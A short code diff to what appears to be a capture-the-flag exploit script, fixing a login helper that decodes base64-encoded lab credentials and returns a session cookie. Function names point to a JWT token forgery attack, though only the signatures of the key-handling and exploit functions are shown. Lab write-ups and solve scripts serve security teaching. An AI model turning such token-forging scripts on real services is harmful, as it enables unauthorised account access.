@@ -33,17 +33,17 @@ def get_jwt_token(public_key: str):
 
 
 def get_session_token():
+    session = requests.Session()
     url = f'{BASE_URL}/login'
     data = 'eyJ1c2VybmFtZSI6ICJzdHVkZW50IiwgInBhc3N3b3JkIjogInRhcnRhbnMifQ=='
 
     data = base64.b64decode(data.encode('utf-8'))
     login_data = json.loads(data)
-    response = requests.post(url, data=login_data)
-
+    response = session.post(url, data=login_data)
     if response.status_code != 200:
         print("Please check server status.")
         return
-    return response.cookies.get["session"]
+    return session.cookies.get("session")
 
 
 def exploit(jwt_token: str, session_token:str):
